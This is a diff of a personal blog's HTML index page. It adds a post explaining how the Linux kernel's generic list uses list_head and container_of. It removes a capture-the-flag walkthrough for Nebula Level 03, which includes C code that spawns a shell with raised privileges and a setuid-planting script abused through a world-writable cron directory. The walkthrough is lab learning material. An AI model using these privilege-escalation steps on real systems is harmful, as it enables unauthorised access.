@@ -90,6 +90,10 @@
           
         
       
+        
+          
+        
+      
 
       <a class="sidebar-nav-item" href="https://github.com/alvarofe">GitHub</a>
     </nav>
@@ -101,6 +105,92 @@
 
     <div class="content container">
       <div class="posts">
+  
+  <div class="post">
+    <h1 class="post-title">
+      <a href="/posts/doublylist">
+        How Linux Implements Generic List
+      </a>
+    </h1>
+
+    <span class="post-date">18 Dec 2014</span>
+
+    <p>I was reading <a href="http://shop.oreilly.com/product/9780596005658.do">Understanding the Linux Kernel</a> about how each process is represented through <code>task_struct</code> and so on. The kernel uses a lot of struct to represent different kind of data and it uses lists to manage relationship between them. It would be a waste of time that for each kind of struct was necessary develop a new list, functions to handle it … etc. To resolve this, Linux makes use of a generic list. The idea is as follows.</p>
+
+<p><img src="/public/images/linked-list.png" alt="linked-list"></p>
+
+<p>If you want that your struct be in a list all what you have to do is include a <code>list_head</code> inside it. <code>list_head</code> is defined as follows (I am using the source code of Linux 2.6.0).</p>
+<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">,</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div>
+<p>Where <code>next</code> and <code>prev</code> point to the next and previous element in the list respectively. The first question that has came to me is how are we able to get the pointer to the real struct if we only have a pointer to <code>list_head</code>?. The solution provided by Linux is very clever. Before to know is better to have better context about a real struct used by Linux as <code>task_struct</code>.</p>
+<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="k">struct</span> <span class="n">task_struct</span> <span class="p">{</span>
+    <span class="k">volatile</span> <span class="kt">long</span> <span class="n">state</span><span class="p">;</span>    <span class="cm">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span>
+    <span class="k">struct</span> <span class="n">thread_info</span> <span class="o">*</span><span class="n">thread_info</span><span class="p">;</span>
+    <span class="kt">atomic_t</span> <span class="n">usage</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">flags</span><span class="p">;</span>    <span class="cm">/* per process flags, defined below */</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ptrace</span><span class="p">;</span>
+
+    <span class="kt">int</span> <span class="n">lock_depth</span><span class="p">;</span>     <span class="cm">/* Lock depth */</span>
+
+    <span class="kt">int</span> <span class="n">prio</span><span class="p">,</span> <span class="n">static_prio</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">list_head</span> <span class="n">run_list</span><span class="p">;</span>
+    <span class="kt">prio_array_t</span> <span class="o">*</span><span class="n">array</span><span class="p">;</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">sleep_avg</span><span class="p">;</span>
+    <span class="kt">long</span> <span class="n">interactive_credit</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">timestamp</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">activated</span><span class="p">;</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">policy</span><span class="p">;</span>
+    <span class="kt">cpumask_t</span> <span class="n">cpus_allowed</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">time_slice</span><span class="p">,</span> <span class="n">first_time_slice</span><span class="p">;</span>
+
+    <span class="k">struct</span> <span class="n">list_head</span> <span class="n">tasks</span><span class="p">;</span>
+
+    <span class="cm">/* there are more types*/</span>
+  <span class="p">.</span> <span class="p">.</span> <span class="p">.</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>You can see how inside the <code>task_struct</code> has a member whose name is <code>task</code> of type <code>list_head</code>. This is used to track each process that run inside the kernel so through this member we can  retrieve all the process. There is a macro inside the Linux Kernel to run through all the process.</p>
+<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#define next_task(p)    list_entry((p)-&gt;tasks.next, struct task_struct, tasks)</span>
+
+<span class="cp">#define for_each_process(p) \</span>
+<span class="cp">    for (p = &amp;init_task ; (p = next_task(p)) != &amp;init_task ; )</span>
+</code></pre></div>
+<p>In <code>list_entry</code> is where we are going to get in this case the pointer to <code>task_struct</code>.</p>
+<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cm">/**</span>
+<span class="cm"> * list_entry - get the struct for this entry</span>
+<span class="cm"> * @ptr:    the &amp;struct list_head pointer.</span>
+<span class="cm"> * @type:   the type of the struct this is embedded in.</span>
+<span class="cm"> * @member: the name of the list_struct within the struct.</span>
+<span class="cm"> */</span>
+<span class="cp">#define list_entry(ptr, type, member) \</span>
+<span class="cp">    container_of(ptr, type, member)</span>
+
+<span class="o">**</span>
+ <span class="o">*</span> <span class="n">container_of</span> <span class="o">-</span> <span class="n">cast</span> <span class="n">a</span> <span class="n">member</span> <span class="n">of</span> <span class="n">a</span> <span class="n">structure</span> <span class="n">out</span> <span class="n">to</span> <span class="n">the</span> <span class="n">containing</span> <span class="n">structure</span>
+ <span class="o">*</span>
+ <span class="o">*</span> <span class="err">@</span><span class="nl">ptr</span><span class="p">:</span>    <span class="n">the</span> <span class="n">pointer</span> <span class="n">to</span> <span class="n">the</span> <span class="n">member</span><span class="p">.</span>
+ <span class="o">*</span> <span class="err">@</span><span class="nl">type</span><span class="p">:</span>   <span class="n">the</span> <span class="n">type</span> <span class="n">of</span> <span class="n">the</span> <span class="n">container</span> <span class="k">struct</span> <span class="n">this</span> <span class="n">is</span> <span class="n">embedded</span> <span class="n">in</span><span class="p">.</span>
+ <span class="o">*</span> <span class="err">@</span><span class="nl">member</span><span class="p">:</span> <span class="n">the</span> <span class="n">name</span> <span class="n">of</span> <span class="n">the</span> <span class="n">member</span> <span class="n">within</span> <span class="n">the</span> <span class="k">struct</span><span class="p">.</span>
+ <span class="o">*</span>
+ <span class="err">*/</span>
+<span class="cp">#define container_of(ptr, type, member) ({          \</span>
+<span class="cp">        const typeof( ((type *)0)-&gt;member ) *__mptr = (ptr);    \</span>
+<span class="cp">        (type *)( (char *)__mptr - offsetof(type,member) );})</span>
+</code></pre></div>
+<p>The magic really happens in <code>container_of</code> and is really simple. The first line declares <code>__mptr</code> equal to the type of the <code>member</code> inside the <code>type</code> and is assigned <code>ptr</code> that in our case would be <code>task</code> of the actual process. The second line   subtract the address of <code>__mptr</code> the offset between the <code>task_struct</code> and the member <code>task</code>, thanks to that you are able to get a reference to the <code>task_struct</code> through <code>task</code>.</p>
+
+<p>Maybe is a little bit confusing at the beginning but once you get used to it, is very useful since you can apply the same idea to your projects. You should check this out <a href="https://github.com/torvalds/linux/blob/master/include/linux/list.h">/include/linux/list.h</a> and seeing the rest of the functions that Linux uses to manipulate list.</p>
+
+<p>If you liked this post, you can
+<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/doublylist&text=How Linux Implements Generic List&via=alvaro_fe">share it with your followers</a>
+or
+<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
+
+  </div>
   
   <div class="post">
     <h1 class="post-title">
@@ -185,77 +275,6 @@ you have changed the <span class="s1">&#39;modified&#39;</span> variable
 
 <p>If you liked this post, you can
 <a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/protostartstack0&text=Stack 0 Protostart&via=alvaro_fe">share it with your followers</a>
-or
-<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
-
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="/posts/nebulalevel03">
-        Nebula Level 03
-      </a>
-    </h1>
-
-    <span class="post-date">14 Dec 2014</span>
-
-    <p>In the challenge 3 there is a crontab called every couple of minutes for user <code>flag03</code>. The directory is as follows. </p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">level03@nebula:/home/flag03<span class="nv">$ </span>ls -l
-total 9
-drwxrwxrwx <span class="m">1</span> flag03 flag03   <span class="m">40</span> Dec <span class="m">14</span> 07:42 writable.d
--rwxr-xr-x <span class="m">1</span> flag03 flag03   <span class="m">98</span> Nov <span class="m">20</span>  <span class="m">2011</span> writable.sh
-</code></pre></div>
-<p>Is logical to think that the script that is executed each two minutes by crontab should be writable.sh.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/sh</span>
-
-<span class="k">for</span> i in /home/flag03/writable.d/* <span class="p">;</span> <span class="k">do</span>
-    <span class="o">(</span><span class="nb">ulimit</span> -t 5<span class="p">;</span> bash -x <span class="s2">&quot;$i&quot;</span><span class="o">)</span>
-    rm -f <span class="s2">&quot;$i&quot;</span>
-<span class="k">done</span>
-</code></pre></div>
-<p>Basically the aim of this script is to execute all files in the writable.d directory. This directory has special permission since everyone can write or read in it as <code>/tmp</code>. We should achieve that the script <code>writable.sh</code> executes some binary and inherit its ownership. In that way if we can execute <code>/bin/sh</code> with the flag03 user we will be able to run <code>getflag</code> in a flag account.</p>
-
-<p>All what we must do is write the following program in <code>/tmp</code> since anyone is able to write in it.</p>
-<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;stdlib.h&gt;</span>
-<span class="cp">#include &lt;unistd.h&gt;</span>
-<span class="cp">#include &lt;sys/types.h&gt;</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="kt">uid_t</span> <span class="n">euid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span> 
-    <span class="kt">gid_t</span> <span class="n">egid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span> 
-    <span class="n">setresgid</span><span class="p">(</span><span class="n">egid</span><span class="p">,</span> <span class="n">egid</span><span class="p">,</span> <span class="n">egid</span><span class="p">);</span>
-    <span class="n">setresuid</span><span class="p">(</span><span class="n">euid</span><span class="p">,</span> <span class="n">euid</span><span class="p">,</span> <span class="n">euid</span><span class="p">);</span>
-
-    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div><div class="highlight"><pre><code class="language-bash" data-lang="bash">level03@nebula:/tmp<span class="nv">$ </span>make pwned
-cc     pwned.c   -o pwned
-level03@nebula:/tmp<span class="nv">$ </span>cat execme
-cp /tmp/pwned /home/flag03/pwned
-chown flag03 /home/flag03/pwned
-chmod u+s /home/flag03/pwned
-level03@nebula:/tmp<span class="nv">$ </span>chmod +x execme
-level03@nebula:/tmp<span class="nv">$ </span>cp execme /home/flag03/writable.d/
-</code></pre></div>
-<p>Copying the file execme in <code>/home/flag03/writable.d</code>, it will be execute each two minutes by the user <code>flag03</code>. Thanks to that,  the binary <code>pwned</code> in the <code>/home/flag03</code> will be set uid by the user <code>flag03</code> and when the user <code>level03</code> executes the binary it will run as <code>flag03</code>.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">level03@nebula:/home/flag03<span class="nv">$ </span>ls -l
-total 9
--rwsrwxr-x <span class="m">1</span> flag03 flag03 <span class="m">7321</span> Dec <span class="m">14</span> 07:42 pwned
-drwxrwxrwx <span class="m">1</span> flag03 flag03   <span class="m">40</span> Dec <span class="m">14</span> 07:42 writable.d
--rwxr-xr-x <span class="m">1</span> flag03 flag03   <span class="m">98</span> Nov <span class="m">20</span>  <span class="m">2011</span> writable.sh
-level03@nebula:/home/flag03<span class="nv">$ </span>./pwned
-sh-4.2<span class="nv">$ </span>id
-<span class="nv">uid</span><span class="o">=</span>996<span class="o">(</span>flag03<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>level03<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>996<span class="o">(</span>flag03<span class="o">)</span>,1004<span class="o">(</span>level03<span class="o">)</span>
-sh-4.2<span class="nv">$ </span>getflag
-You have successfully executed getflag on a target account
-</code></pre></div>
-<blockquote>
-<p>If you try run <code>writable.sh</code> by your own you execute everything with <code>level03</code> ownership. I had a problem due to crontab is wasn’t call so I had to configure it to work. All what you should do is the following in the terminal write <code>crontab -e</code> and configure the script to run as: <code>* * * * * flag03 /home/flag03/writable.sh</code>. With this the script will be run each minute by the user <code>flag03</code></p>
-</blockquote>
-
-<p>If you liked this post, you can
-<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/nebulalevel03&text=Nebula Level 03&via=alvaro_fe">share it with your followers</a>
 or
 <a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
 
